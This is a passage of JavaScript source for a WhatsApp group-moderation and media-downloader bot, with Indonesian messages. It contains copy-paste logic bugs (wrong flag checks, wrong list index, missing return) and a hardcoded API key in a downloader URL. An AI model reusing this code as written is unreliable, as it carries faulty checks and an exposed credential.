replygcxeon('*Sukses Mengaktifkan Anti Tautan Instagram Di Grup Ini*')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`「 PERINGATAN 」\`\`\`\n\n*Sekarang Peserta Yang Memposting Tautan Instagram Akan Ditendang*`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkInstagram) return replygcxeon('*Sudah Dinonaktifkan*')
let off = ntilinkig.indexOf(from)
ntilinkig.splice(off, 1)
fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(ntilinkig))
replygcxeon('*Sukses Menonaktifkan Anti Tautan Instagram Di Grup Ini*')
} else {
  await replygcxeon(`*${prefix + command} on* - Untuk Mengaktifkan Anti Tautan Instagram\n*${prefix + command} off* - Untuk Menonaktifkan Anti Tautan Instagram`)
  }
  }
  break
        case 'antilinkfacebook': case 'antilinkfb': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin)
if (args[0] === "on") {
if (AntiLinkFacebook) return replygcxeon('*Sudah Diaktifkan*')
ntilinkfb.push(from)
fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(ntilinkfb))
replygcxeon('*Sukses Mengaktifkan Anti Tautan Facebook Di Grup Ini*')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`「 PERINGATAN 」\`\`\`\n\n*Sekarang Peserta Yang Memposting Tautan Facebook Akan Ditendang*`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkFacebook) return replygcxeon('*Sudah Dinonaktifkan*')
let off = ntilinkfb.indexOf(from)
ntilinkfb.splice(off, 1)
fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(ntilinkfb))
replygcxeon('*Sukses Menonaktifkan Anti Tautan Facebook  Di Grup Ini*')
} else {
  await replygcxeon(`*${prefix + command} on* - Untuk Menonaktifkan Anti Tautan Facebook\n*${prefix + command} off* - Untuk Menonaktifkan Anti Tautan Facebook`)
  }
  }
  break
          case 'antilinktelegram': case 'antilinktg': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin)
if (args[0] === "on") {
if (AntiLinkTelegram) return replygcxeon('*Sudah Diaktifkan*')
ntilinktg.push(from)
fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(ntilinktg))
replygcxeon('*Sukses Mengaktifkan Anti Tautan Telegram Di Grup Ini*')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`「 PERINGATAN 」\`\`\`\n\n*Sekarang Peserta Yang Mengirimkan Tautan Telegram Akan Ditendang*`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTelegram) return replygcxeon('*Sudah Dinonaktifkan*')
let off = ntilinktg.indexOf(from)
ntilinktg.splice(off, 1)
fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(ntilinktg))
replygcxeon('*Sukses Menonaktifkan Anti Tautan Telegram Di Grup Ini*')
} else {
  await replygcxeon(`*${prefix + command} on* - Untuk Mengaktifkan Anti Tautan Telegram\n*${prefix + command} off* - Untuk Menonaktifkan Anti Tautan Telegram`)
  }
  }
  break
            case 'antilinktiktok': case 'antilinktt': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin)
if (args[0] === "on") {
if (AntiLinkTiktok) return replygcxeon('*Sudah Diaktifkan*')
ntilinktt.push(from)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(ntilinktt))
replygcxeon('*Sukses Mengaktifkan Anti Tautan Tik Tok Di Grup Ini*')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`「 PERINGATAN 」\`\`\`\n\n*Sekarang Peserta Yang Memposting Tautan Tik Tok Akan Ditendang*`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTiktok) return replygcxeon('*Sudah Dinonaktifkan*')
let off = ntilinktt.indexOf(from)
ntilinktt.splice(off, 1)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(ntilinktt))
replygcxeon('*Sukses Menonaktifkan Anti Tautan Tik Tok Di Grup Ini*')
} else {
  await replygcxeon(`*${prefix + command} on* - Untuk Mengaktifkan Anti Tautan Tik Tok\n*${prefix + command} off* - Untuk Menonaktifkan Anti Tautan Tik Tok`)
  }
  }
  break
            case 'antilinktwt': case 'antilinktwitter': case 'antilinktwit': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin)
if (args[0] === "on") {
if (AntiLinkTwitter) return replygcxeon('*Sudah Diaktifkan*')
ntilinktwt.push(from)
fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(ntilinktwt))
replygcxeon('*Sukses Mengaktifkan Anti Tautan Twitter Di Grup Ini*')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`「 PERINGATAN 」\`\`\`\n\n*Sekarang Peserta Yang Memposting Tautan Twitter Akan Ditendang*`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTwitter) return replygcxeon('*Sudah Dinonaktifkan*')
let off = ntilinktwt.indexOf(from)
ntilinktwt.splice(off, 1)
fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(ntilinktwt))
replygcxeon('*Sukses Menonaktifkan Anti Tautan Twitter Di Grup Ini*')
} else {
  await replygcxeon(`*${prefix + command} on* - Untuk Mengaktifkan Anti Tautan Twitter\n*${prefix + command} off* - Untuk Menonaktifkan Anti Tautan Twitter`)
  }
  }
  break
              case 'antilinkall': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin)
if (args[0] === "on") {
if (AntiLinkTwitter) return replygcxeon('*Sudah Diaktifkan*')
ntilinkall.push(from)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
replygcxeon('*Sukses Mengaktifkan Anti Semua Tautan Di Grup Ini*')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`「 PERINGATAN 」\`\`\`\n\n*Sekarang Peserta Yang Memposting Tautan Apaun Itu Akan Dikeluarkan*`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkAll) return replygcxeon('*Sudah Dinonaktifkan*')
let off = ntilinkall.indexOf(from)
ntilinkall.splice(off, 1)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
replygcxeon('*Sukses Menonaktifkan Anti Semua Tautan Di Grup Ini*')
} else {
  await replygcxeon(`*${prefix + command} on* - Untuk Mengaktifkan Anti Semua Tautan\n*${prefix + command} off* - Untuk Menonaktifkan Anti Semua Tautan`)
  }
  }
  break
case 'antitoxic': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin)
if (args[0] === "on") {
if (antiToxic) return replygcxeon('*Sudah Diaktifkan*')
nttoxic.push(from)
fs.writeFileSync('./database/antitoxic.json', JSON.stringify(nttoxic))
replygcxeon('*Sukses Mengaktifkan Anti Beracun Di Grup Ini*')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`「 PERINGATAN 」\`\`\`\n\n*Sekarang Peserta Yang Menggunakan Kata Kotor Akan Ditendang*`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiToxic) return replygcxeon('*Sudah Dinonaktifkan*')
let off = nttoxic.indexOf(from)
nttoxic.splice(off, 1)
fs.writeFileSync('./database/antitoxic.json', JSON.stringify(nttoxic))
replygcxeon('*Sukses Menonaktifkan Anti Beracun Di Grup Ini*')
} else {
  await replygcxeon(`*${prefix + command} on* - Untuk Mengaktifkan Anti Beracun\n*${prefix + command} off* - Untuk Menonaktifkan Anti Beracun`)
  }
  }
  break
case 'jejebeb': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin)
if (args[0] === "on") {
if (antiWame) return replygcxeon('*Sudah Diaktifkan*')
ntwame.push(from)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(ntwame))
replygcxeon('*Sukses Mengaktifkan Anti Tautan Wa.me Di Grup Ini*')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`「 PERINGATAN 」\`\`\`\n\n*Sekarang Peserta Yang Memposting Tautan Wa.me Akan Ditendang*`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiWame) return replygcxeon('*Sudah Dinonaktifkan*')
let off = nttoxic.indexOf(from)
ntwame.splice(off, 1)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(ntwame))
replygcxeon('*Sukses Menonaktifkan Anti Tautan Wa.me Di Grup Ini*')
} else {
  await replygcxeon(`Please Type The Option\n\nContoh: ${prefix + command} on\nContoh: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antilinkgc': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin)
if (args[0] === "on") {
if (Antilinkgc) return replygcxeon('*Sudah Diaktifkan*')
ntlinkgc.push(from)
fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc))
replygcxeon('*Sukses Mengaktifkan Anti Wa.me Di Grup Ini*')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`「 PERINGATAN 」\`\`\`\n\nNobody is allowed to send group link in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!Antilinkgc) return replygcxeon('*Sudah Dinonaktifkan*')
let off = ntlinkgc.indexOf(from)
ntlinkgc.splice(off, 1)
fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc))
replygcxeon('*Sukses Menonaktifkan Anti Wa.Me Di Grup Ini*')
} else {
await replygcxeon(`*${prefix + command} on* - Untuk Mengaktifkan Anti Tautan Wa.me\n*${prefix + command} off* - Untuk Menonaktifkan Anti Tautan Wa.me`)
  }
  }
  break
   case 'leavegc': {
                if (!XeonTheCreator) return replygcxeon(mess.owner)
                await XeonBotInc.groupLeave(m.chat).then((res) => replygcxeon(jsonformat(res))).catch((err) => replygcxeon(jsonformat(err)))
            }
            break
case 'jejebsb': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await XeonBotInc.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => replygcxeon(jsonformat(res))).catch((err) => replygcxeon(jsonformat(err)))
}
break
case 'closetime': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return replygcxeon('Format: *.closetime Waktu*\nContoh: *.closetime 10 second*\n\n*Format Waktu: second, minute, hour, & day*')
}
replygcxeon(`*${q} Lagi Grup Akan Ditutup*`)
setTimeout(() => {
var nomor = m.participant
const close = `*Tepat Waktu* Grup Ditutup Oleh Admin\nKini Hanya Admin Yang Dapat Mengirim Pesan`
XeonBotInc.groupSettingUpdate(from, 'announcement')
replygcxeon(close)
}, timer)
}
break
           case 'ephemeral': {
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (!isAdmins) return replygcxeon(mess.admin)
                if (!text) return replygcxeon('Format: *.ephemeral enable/disable*')
                if (args[0] === 'enable') {
                    await XeonBotInc.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => replygcxeon(jsonformat(res))).catch((err) => replygcxeon(jsonformat(err)))
                } else if (args[0] === 'disable') {
                    await XeonBotInc.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => replygcxeon(jsonformat(res))).catch((err) => replygcxeon(jsonformat(err)))
                }
            }
            break
            case 'delete': case 'del': case 'd': {
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) return replygcxeon('*Pesan Tersebut Bukan Dikirim Oleh Saya*')
                 XeonBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            case 'hvc': case 'vvv': case 'hhh': case 'jhc': {
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                let response = await XeonBotInc.groupInviteCode(m.chat)
                XeonBotInc.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nGroup Link : ${groupMetadata.subject}`, m, { detectLink: true })
            }
            break
case 'opentime': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return replygcxeon('Format: *.opentime Waktu*\nContoh: *.opentime 10 second*\n\n*Format Waktu: second, minute, hour, & day*')
}
replygcxeon(`*${q} Lagi Grup Akan Dibuka*`)
setTimeout(() => {
var nomor = m.participant
const open = `*Tepat Waktu* Grup Dibuka Oleh Admin\nKini Semua Peserta Dapat Mengirim Pesan`
XeonBotInc.groupSettingUpdate(from, 'not_announcement')
replygcxeon(open)
}, timer)
}
break
case 'jhgcc': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await XeonBotInc.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => replygcxeon(jsonformat(res))).catch((err) => replygcxeon(jsonformat(err)))
}
break
    case 'hhv': case 'hjgc': {
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (!isAdmins) return replygcxeon(mess.admin)
                if (!text) return replygcxeon('Format: *.setname Nama Baru Grup*')
                await XeonBotInc.groupUpdateSubject(m.chat, text).then((res) => replygcxeon(mess.success)).catch((err) => replygcxeon(jsonformat(err)))
            }
            break
          case 'setdehhhsc': case 'sehgvtdesk': {
                if (!m.isGroup) return replygcxeon(mess.group)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                if (!isAdmins) return replygcxeon(mess.admin)
                if (!text) return replygcxeon('Format: *.setdesc Deskripsi Grup*')
                await XeonBotInc.groupUpdateDescription(m.chat, text).then((res) => replygcxeon(mess.success)).catch((err) => replygcxeon(jsonformat(err)))
            }
            break
case 'jjgc': case 'jhvc': case 'hhh': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!quoted) return replygcxeon(`Kirim Atau Balas Gambar Dengan Keterangan *.setppgroup*`)
if (!/image/.test(mime)) return replygcxeon(`Kirim Atau Balas Gambar Dengan Keterangan *${prefix + command}*`)
if (/webp/.test(mime)) return replygcxeon(`Kirim Atau Balas Gambar Dengan Keterangan  *${prefix + command}*`)
var mediz = await XeonBotInc.downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')
if (args[0] == `/panjang`) {
var { img } = await generateProfilePicture(mediz)
await XeonBotInc.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(mediz)
replygcxeon(`*Sukses*`)
} else {
var memeg = await XeonBotInc.updateProfilePicture(m.chat, { url: mediz })
fs.unlinkSync(mediz)
replygcxeon(`*Sukses*`)
}
}
break
case 'projjkmote': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await XeonBotInc.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => replygcxeon(jsonformat(res))).catch((err) => replygcxeon(jsonformat(err)))
}
break
case 'dekkkmote': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await XeonBotInc.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => replygcxeon(jsonformat(res))).catch((err) => replygcxeon(jsonformat(err)))
}
break
case 'hidklletag': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
XeonBotInc.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
case 'tagall': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
me = m.sender
let teks = `*${themeemoji} Menandai Semua Peserta*
 
*Pelaku:* @${me.split('@')[0]}
*Pesan:* ${q ? q : 'Tanpa Pesan'}\n\n`
for (let mem of participants) {
teks += `${themeemoji} @${mem.id.split('@')[0]}\n`
}
XeonBotInc.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break
case 'ebinary': {
if (!q) return replygcxeon(`Kirim Atau Balas Gambar Dengan Keterangan *${prefix + command}*`)
replygcxeon(mess.wait)
let { eBinary } = require('./scrape/binary')
let eb = await eBinary(`${q}`)
replygcxeon(eb)
}
break
case 'dbinary': {
if (!q) return replygcxeon(`Kirim Atau Balas Gambar Dengan Keterangan *${prefix + command}*`)
replygcxeon(mess.wait)
let { dBinary } = require('./scrape/binary')
let db = await dBinary(`${q}`)
replygcxeon(db)
}
break
case 'fbdl': case 'facebook': {
if (!q) return replygcxeon(`Format: *.facebook Tautan*`)
let anu = await fetchJson(`https://xeonapi.onrender.com/api/dowloader/fbdown?url=${q}&apikey=a565ddca`)
XeonBotInc.sendMessage(m.chat, { video: { url: anu.result.HD }, caption: 'Here you go!.'}, {quoted: m})
}
break
case 'tiktjkkkok':{ 
if (!text) return replygcxeon( `Format: *${prefix + command} Tautan*`)
if (!q.includes('tiktok')) return replygcxeon(`*Tautan Tidak Sah*`)
replygcxeon(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
XeonBotInc.sendMessage(m.chat, { caption: `*Sukses*`, video: { url: data.watermark }}, {quoted:m})
})
}
break
case 'tiktokkkkaudio':{
if (!text) return replygcxeon( `Format: *${prefix + command} Tautan*`)
if (!q.includes('tiktok')) return replygcxeon(`*Tautan Tidak Sah*`)
replygcxeon(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
XeonBotInc.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}
break
case 'medbbvciafire':
if (!q) return replygcxeon(`Format: *.mediafire Tautan*`)
if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return replygcxeon('The link you sent is not a mediafire link or the link is invalid!')
replygcxeon(mess.wait)
let medfr = await scp1.mediafire(q)
await XeonBotInc.sendMessage(from, {document:{url:medfr.link},jpegThumbnail : defaultpp, fileName:`Downloaded By ${m.pushName}.${medfr.mime}`, mimetype:`application/${mime}`},{quoted:m})
break
case 'google': {
if (!q) return replygcxeon(`Format: *${prefix + command} Kata Kunci*`)
replygcxeon(mess.wait)
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Penelusuran Google Dari: *${text}*\n\n`
for (let g of res) {
teks += `*• Judul:* ${g.title}\n`
teks += `*• Deskripsi:* ${g.snippet}\n`
teks += `*• Tautan:* ${g.link}\n\n────────────────────────\n\n`
} 
replygcxeon(teks)
})
}
break
case 'happymod':{
if (!q) return replygcxeon(`Format: *${prefix+command} Nama Apk*`)
replygcxeon(mess.wait)
let kat = await scp1.happymod(q)
replygcxeon(util.format(kat))
}
break
case 'recipe':{
if (!q) return replygcxeon(`Format: *${prefix+command} Nama Makanan*`)
replygcxeon(mess.wait)
let ker = await scp1.cariresep(q)
replygcxeon(util.format(ker))
}
break
case 'readrecipe':{
if (!q) return replygcxeon(`Format: *${prefix+command} Tautan Dari .recipe Atau Situs resepkoki.id*`)
replygcxeon(mess.wait)
let rain = await scp1.bacaresep(q)
let dty = `*Resep Di Bawah*

*Judul:* ${rain.judul_nya}
*Durasi:* ${rain.waktu_nya}
*Hasil:* ${rain.hasil_nya}
*Tingkat Kesulitan:* ${rain.tingkat_kesulitan}
*Bahan:*
${rain.bahan_nya}`
XeonBotInc.sendMessage(m.chat,{
image:{
url:rain.thumb_nya},
caption:dty,
jpegThumbnail: defaultpp},
{quoted:m})
}
break
case 'jhg':
case 'jhgc': case 'jhcc': {
                if (!text) return replygcxeon(`Format: *${prefix + command} Kata Kunci*`)
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = '*Pencarian Youtube*\n\n*Hasil Dari '+text+'*\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `*${themeemoji} No:* ${no++}\n*${themeemoji} Tipe:* ${i.type}\n*${themeemoji} ID Vidio:* ${i.videoId}\n*${themeemoji} Judul:* ${i.title}\n*${themeemoji} Penonton:* ${i.views}\n*${themeemoji} Durasi:* ${i.timestamp}\n*${themeemoji} Diupload:* ${i.ago}\n*${themeemoji} Tautan:* ${i.url}\n\n──────────────────────\n\n`
                }
                XeonBotInc.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
case 'hhvc':{
if (!text) return replygcxeon(`Format: *${prefix+command} Kata Kunci*`)
replygcxeon(mess.wait)
let search = await yts(text)
let url = search.videos[0].url
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
let eek = await getBuffer(anu.thumbnail)
let owned = `${ownernumber}@s.whatsapp.net`
let ngen = `
*Judul:* ${anu.title}
*EXT:* Search
*ID:* ${anu.videoId}
*Penonton:* ${anu.views}
*Diupload:* ${anu.ago}
*Pengarang:* ${anu.author.name}
*Saluran:* ${anu.author.url}
*Tautan:* ${anu.url}

Salin Tautan Di Atas Dan Ketik *.ytmp3 Tautan* Untuk Audio Dan *.ytmp4 Tauta* Untuk Video`
XeonBotInc.sendMessage(m.chat, { image : eek, caption: ngen }, { quoted: m})
break
}
case 'plahhhy':  case 'shhhong': {
if (!text) return replygcxeon(`Format: *${prefix + command} Kata Kunci*`)
const xeonplaymp3 = require('./lib/ytdl2')
const { fetchBuffer } = require("./lib/myfunc2")
let yts = require("youtube-yts")
        let search = await yts(text)
        let anup3k = search.videos[0]
const pl= await xeonplaymp3.mp3(anup3k.url)
await XeonBotInc.sendMessage(m.chat,{
    audio: fs.readFileSync(pl.path),
    fileName: anup3k.title + '.mp3',
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:anup3k.title,
            body: botname,
            thumbnail: await fetchBuffer(pl.meta.image),
            mediaType:2,
            mediaUrl:anup3k.url,
        }

    },
},{quoted:m})
await fs.unlinkSync(pl.path)
}
break
case 'ytmhhhp4': case 'hhhhhh': {
const xeonvidoh = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !xeonvidoh.isYTUrl(text)) replygcxeon(`Format: *${prefix + command} Tautan* 128kbps`)
const vid=await xeonvidoh.mp4(text)
const ytc=`
*${themeemoji} Judul:* ${vid.title}
*${themeemoji} Tanggal:* ${vid.date}
*${themeemoji} Durasi:* ${vid.duration}
*${themeemoji} Kualitas:* ${vid.quality}`
await XeonBotInc.sendMessage(m.chat,{
    video: {url:vid.videoUrl},
    caption: ytc
},{quoted:m})
}
break
case 'ytvhhhxxx': case 'ytmpjjh4xxx': case 'mpjhh4xxx':{
if (!text) return replygcxeon('Format: *.ytvxxx Tautan*')
replygcxeon(mess.wait)
downloadMp4(text)
}
break
case 'ytaxjhhxx': case 'ytmpjjjjj3xxx': case 'ytjjjjmp3':{
if (!text) return replygcxeon('Format: *.ytaxxx Tautan')
replygcxeon(mess.wait)
downloadMp3(text)
}
break 
case 'getjjjcase':
if (!XeonTheCreator) return replygcxeon(mess.owner)
const getCase = (cases) => {
return "case"+`'${cases}'`+fs.readFileSync("XeonCheems7.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
replygcxeon(`${getCase(q)}`)
break
case 'addbvvprem':
if (!XeonTheCreator) return replygcxeon(mess.owner)
if (!args[0]) return replygcxeon(`Format: *${prefix+command} Nomor*`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await XeonBotInc.onWhatsApp(prrkek)
if (ceknya.length == 0) return replygcxeon(`*Masukkan Nomor Sah Dan Terdaftar Di WhatsApp*`)
prem.push(prrkek)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
replygcxeon(`Akun *${prrkek}* Sekarang Premium*`)
break
case 'delbvvprem':
if (!XeonTheCreator) return replygcxeon(mess.owner)
if (!args[0]) return replygcxeon(`Format: *${prefix+command} Nomor*`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
replygcxeon(`Akun *${ya}* Sekarang Bukan Premium`)
break
case 'addbadword':{
if (!XeonTheCreator) return replygcxeon(mess.owner)
if (args.length < 1) return replygcxeon('Format: *addbadword Kata Kotor*')
if (BadXeon.includes(q)) return replygcxeon("*Kata Tersebut Sudah Terdaftar*")
BadXeon.push(q)
fs.writeFileSync('./database/bad.json', JSON.stringify(BadXeon))
replygcxeon(`*Sukses Menambahkan Kata Kotor*\nCek Dengan Perintah *${prefix}listbadword*`)
}
break
case 'delbadword':{
if (!XeonTheCreator) return replygcxeon(mess.owner)
if (args.length < 1) return replygcxeon('Format: *.delbadword Kata Kotor*')
if (!BadXeon.includes(q)) return replygcxeon("*Kata Tersebut Tidak Ditemukan Dalam Basis Data*")
let wanu = BadXeon.indexOf(q)
BadXeon.splice(wanu, 1)
fs.writeFileSync('./database/bad.json', JSON.stringify(BadXeon))
replygcxeon(`Sukses Menghapus Kata *${q}*`)
}
break
case 'listbadword':{
let teks = '┌──⭓「 *DAFTAR KATA KOTOR* 」\n│\n'
for (let x of BadXeon) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Total: ${BadXeon.length}*`
replygcxeon(teks)
}
break
case 'hhg':{
if (!XeonTheCreator) return replygcxeon(mess.owner)
if (args.length < 1) return replygcxeon('Format: *.addvideo Nama Vidio*')
if (VideoXeon.includes(q)) return replygcxeon("*Nama Tersebut Sudah Digunakan*")
let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
VideoXeon.push(q)
await fsx.copy(delb, `./XeonMedia/video/${q}.mp4`)
